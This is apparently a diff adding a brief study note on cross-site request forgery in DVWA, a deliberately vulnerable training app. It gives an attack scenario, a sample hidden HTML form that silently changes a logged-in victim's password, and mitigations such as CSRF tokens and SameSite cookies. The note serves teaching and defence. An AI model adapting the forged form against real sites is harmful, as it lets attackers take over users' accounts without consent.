@@ -1,0 +1,23 @@
+3️⃣ Cross-Site Request Forgery (CSRF)
+
+OWASP: A01 – Broken Access Control
+
+⚔️ Attack Scenario
+
+Victim logged into DVWA
+
+Attacker sends malicious link
+
+Password changes without consent
+
+Sample Malicious HTML
+<form action="http://dvwa/change_password.php" method="POST">
+<input type="hidden" name="password_new" value="hacked123">
+<input type="submit">
+</form>
+🛡️ Mitigation
+
+CSRF tokens
+
+SameSite cookies
+$_SESSION['token'] = bin2hex(random_bytes(32));
